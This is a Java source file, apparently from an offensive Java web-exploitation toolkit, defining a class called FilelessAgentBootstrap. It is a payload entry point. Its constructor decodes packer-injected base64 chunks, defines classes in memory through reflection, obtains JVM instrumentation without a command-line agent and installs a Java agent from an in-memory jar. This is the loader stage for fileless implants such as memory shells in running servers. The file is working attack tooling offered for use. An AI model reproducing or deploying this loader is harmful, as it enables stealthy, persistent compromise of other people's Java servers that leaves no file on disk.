package com.reajason.javaweb.fileless;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.lang.instrument.Instrumentation;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.jar.Manifest;
import java.util.zip.GZIPInputStream;

/**
 * Self-contained payload entry point and in-memory Agent installer.
 * The packer relocates this class and replaces {@link #payloadChunks()} for each delivery.
 */
public class FilelessAgentBootstrap {
    private static final int PAYLOAD_MAGIC = 0x464c4131; // FLA1
    private static final int MAX_RUNTIME_CLASSES = 256;
    private static final int MAX_ENTRY_SIZE = 128 * 1024 * 1024;

    public FilelessAgentBootstrap() throws Exception {
        String[] chunks = payloadChunks();
        if (chunks.length != 0) {
            installPayload(chunks);
        }
    }

    private static String[] payloadChunks() {
        return new String[0];
    }

    private void installPayload(String[] chunks) throws Exception {
        byte[] packed = decodeBase64(concat(chunks));
        DataInputStream input = new DataInputStream(new GZIPInputStream(new ByteArrayInputStream(packed)));
        try {
            if (input.readInt() != PAYLOAD_MAGIC) {
                throw new IOException("Invalid fileless payload header");
            }
            int classCount = input.readInt();
            if (classCount <= 0 || classCount > MAX_RUNTIME_CLASSES) {
                throw new IOException("Invalid runtime class count: " + classCount);
            }
            ClassLoader loader = getClass().getClassLoader();
            for (int i = 0; i < classCount; i++) {
                String className = input.readUTF();
                byte[] classBytes = readEntry(input);
                defineClass(loader, className, classBytes);
            }
            byte[] agentJar = readEntry(input);
            if (input.read() != -1) {
                throw new IOException("Trailing data in fileless payload");
            }
            Instrumentation instrumentation = acquireInstrumentation();
            install(agentJar, "", instrumentation, defaultParentLoader());
        } finally {
            input.close();
        }
    }

    private Class<?> defineClass(ClassLoader loader, String className, byte[] bytes) throws Exception {
        if (isJava9OrLater()) {
            Class<?> methodHandles = Class.forName("java.lang.invoke.MethodHandles");
            Object lookup = methodHandles.getMethod("lookup").invoke(null);
            Class<?> lookupClass = Class.forName("java.lang.invoke.MethodHandles$Lookup");
            Method defineClass = lookupClass.getMethod("defineClass", byte[].class);
            return (Class<?>) invoke(defineClass, lookup, (Object) bytes);
        }
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
                String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        return (Class<?>) invoke(defineClass, loader, className, bytes, 0, bytes.length);
    }

    private static boolean isJava9OrLater() {
        String version = System.getProperty("java.specification.version", "1.6");
        return !version.startsWith("1.");
    }

    private static byte[] readEntry(DataInputStream input) throws IOException {
        int length = input.readInt();
        if (length <= 0 || length > MAX_ENTRY_SIZE) {
            throw new IOException("Invalid payload entry size: " + length);
        }
        byte[] bytes = new byte[length];
        input.readFully(bytes);
        return bytes;
    }

    private static String concat(String[] chunks) {
        StringBuilder value = new StringBuilder();
        for (int i = 0; i < chunks.length; i++) {
            value.append(chunks[i]);
        }
        return value.toString();
    }

    private static byte[] decodeBase64(String value) {
        ByteArrayOutputStream output = new ByteArrayOutputStream(value.length() * 3 / 4);
        int buffer = 0;
        int bits = 0;
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            if (c == '=') {
                break;
            }
            int decoded = decodeBase64Character(c);
            if (decoded < 0) {
                throw new IllegalArgumentException("Invalid Base64 payload");
            }
            buffer = (buffer << 6) | decoded;
            bits += 6;
            if (bits >= 8) {
                bits -= 8;
                output.write((buffer >> bits) & 0xff);
                buffer &= (1 << bits) - 1;
            }
        }
        return output.toByteArray();
    }

    private static int decodeBase64Character(char c) {
        if (c >= 'A' && c <= 'Z') {
            return c - 'A';
        }
        if (c >= 'a' && c <= 'z') {
            return c - 'a' + 26;
        }
        if (c >= '0' && c <= '9') {
            return c - '0' + 52;
        }
        if (c == '+') {
            return 62;
        }
        if (c == '/') {
            return 63;
        }
        return -1;
    }

    @Override
    public String toString() {
        return getClass().getName();
    }

    public static ClassLoader install(byte[] jarBytes, String agentArgs) throws Exception {
        return install(jarBytes, agentArgs, defaultParentLoader());
    }

    public static ClassLoader install(byte[] jarBytes, String agentArgs,
                                      ClassLoader parentLoader) throws Exception {
        return install(jarBytes, agentArgs, acquireInstrumentation(), parentLoader);
    }

    public static ClassLoader install(byte[] jarBytes, String agentArgs,
                                      Instrumentation instrumentation) throws Exception {
        return install(jarBytes, agentArgs, instrumentation, defaultParentLoader());
    }

    public static ClassLoader install(byte[] jarBytes, String agentArgs,
                                      Instrumentation instrumentation,
                                      ClassLoader parentLoader) throws Exception {
        requireCapabilities(instrumentation);
        ClassLoader loader = newJarLoader(jarBytes, parentLoader);
        Manifest manifest = (Manifest) invoke(loader.getClass().getMethod("getManifest"), loader);
        String contract = requiredAttribute(manifest, "Fileless-Agent-Contract");
        if (!"1".equals(contract)) {
            throw new UnsupportedOperationException("Unsupported Fileless-Agent-Contract: " + contract);
        }
        String agentClassName = requiredAttribute(manifest, "Agent-Class");
        install(agentClassName, agentArgs, instrumentation, loader);
        return loader;
    }

    public static void install(String agentClassName, String agentArgs) throws Exception {
        install(agentClassName, agentArgs, acquireInstrumentation());
    }

    public static void install(String agentClassName, String agentArgs,
                               Instrumentation instrumentation) throws Exception {
        install(agentClassName, agentArgs, instrumentation, FilelessAgentBootstrap.class.getClassLoader());
    }

    public static void install(String agentClassName, String agentArgs,
                               Instrumentation instrumentation, ClassLoader loader) throws Exception {
        requireCapabilities(instrumentation);
        if (agentClassName == null || agentClassName.length() == 0) {
            throw new IllegalArgumentException("agentClassName is required");
        }
        if (loader == null) {
            throw new IllegalArgumentException("loader is required");
        }

        Class<?> agentClass = Class.forName(agentClassName, true, loader);
        Method entryPoint = findEntryPoint(agentClass);
        Thread thread = Thread.currentThread();
        ClassLoader originalLoader = thread.getContextClassLoader();
        thread.setContextClassLoader(agentClass.getClassLoader());
        try {
            if (entryPoint.getParameterTypes().length == 2) {
                entryPoint.invoke(null, agentArgs, instrumentation);
            } else {
                entryPoint.invoke(null, agentArgs);
            }
        } catch (InvocationTargetException e) {
            throw reflectionFailure(e);
        } finally {
            thread.setContextClassLoader(originalLoader);
        }
    }

    private static Instrumentation acquireInstrumentation() throws Exception {
        Class<?> providerType = runtimeClass("HotSpotProfileProvider");
        Object provider = construct(providerType.getConstructor());
        return (Instrumentation) invoke(providerType.getMethod("acquire"), provider);
    }

    private static ClassLoader newJarLoader(byte[] jarBytes, ClassLoader parentLoader) throws Exception {
        Class<?> loaderType = runtimeClass("JarLoader");
        Constructor<?> constructor = loaderType.getConstructor(byte[].class, ClassLoader.class);
        return (ClassLoader) construct(constructor, jarBytes, parentLoader);
    }

    private static Class<?> runtimeClass(String simpleName) throws ClassNotFoundException {
        String bootstrapName = FilelessAgentBootstrap.class.getName();
        String packagePrefix = bootstrapName.substring(0, bootstrapName.lastIndexOf('.') + 1);
        return Class.forName(packagePrefix + simpleName, true, FilelessAgentBootstrap.class.getClassLoader());
    }

    private static Object invoke(Method method, Object target, Object... args) throws Exception {
        try {
            return method.invoke(target, args);
        } catch (InvocationTargetException e) {
            throw reflectionFailure(e);
        }
    }

    private static Object construct(Constructor<?> constructor, Object... args) throws Exception {
        try {
            return constructor.newInstance(args);
        } catch (InvocationTargetException e) {
            throw reflectionFailure(e);
        }
    }

    private static Exception reflectionFailure(InvocationTargetException e) {
        Throwable cause = e.getCause();
        if (cause instanceof Error) {
            throw (Error) cause;
        }
        return cause instanceof Exception ? (Exception) cause : e;
    }

    private static void requireCapabilities(Instrumentation instrumentation) {
        if (instrumentation == null) {
            throw new IllegalArgumentException("instrumentation is required");
        }
        if (!instrumentation.isRedefineClassesSupported()) {
            throw new UnsupportedOperationException("Instrumentation does not support class redefinition");
        }
        if (!instrumentation.isRetransformClassesSupported()) {
            throw new UnsupportedOperationException("Instrumentation does not support class retransformation");
        }
    }

    private static String requiredAttribute(Manifest manifest, String name) {
        String value = manifest.getMainAttributes().getValue(name);
        if (value == null || value.trim().length() == 0) {
            throw new IllegalArgumentException("Agent manifest attribute is required: " + name);
        }
        return value.trim();
    }

    private static ClassLoader defaultParentLoader() {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        return loader == null ? FilelessAgentBootstrap.class.getClassLoader() : loader;
    }

    private static Method findEntryPoint(Class<?> agentClass) throws NoSuchMethodException {
        Method method = findEntryPoint(agentClass, "agentmain");
        if (method == null) {
            method = findEntryPoint(agentClass, "premain");
        }
        if (method == null) {
            throw new NoSuchMethodException("No public agentmain/premain entry point in " + agentClass.getName());
        }
        return method;
    }

    private static Method findEntryPoint(Class<?> agentClass, String name) {
        try {
            return agentClass.getMethod(name, String.class, Instrumentation.class);
        } catch (NoSuchMethodException ignored) {
            try {
                return agentClass.getMethod(name, String.class);
            } catch (NoSuchMethodException notFound) {
                return null;
            }
        }
    }
}
